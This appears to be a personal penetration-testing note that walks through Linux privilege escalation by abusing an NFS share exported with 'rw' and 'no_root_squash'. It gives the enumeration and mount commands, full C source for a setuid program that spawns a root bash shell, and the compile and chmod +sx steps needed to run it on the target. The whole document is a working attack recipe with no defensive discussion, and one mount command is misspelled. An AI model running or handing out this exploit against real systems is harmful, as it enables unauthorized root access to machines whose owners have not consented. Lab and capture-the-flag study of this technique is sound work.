use the command `cat /etc/exports` to find nfs shares

If one of these NFS shares has "rw" permissions and a "no\_root\_squash” option, you then need to use this command on attacker machine (as root):

`showmount -e <target_ip_address>`

this will list the available nfs shares, then mount the share when in **root** with:

`mkdir /tmp/localshare`

`mmount -o rw <target_ip_address>:/targetshare /tmp/localshare`

then make a simple priv esc c code file with:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

then while in the share use these commands as root on your attacker machine to compile them:

`gcc code.c -o code -w`

`chmod +sx code`

![ebad508331ce82db091532e89d3f4a9b.png](../../../_resources/ebad508331ce82db091532e89d3f4a9b.png)

from here navigate to the share on the target machine and execute the code

![0d05744de9e6b253db17987bb11d31f2.png](../../../_resources/0d05744de9e6b253db17987bb11d31f2.png)

### NOTE: this wont work on kali arm distro vm, only on x64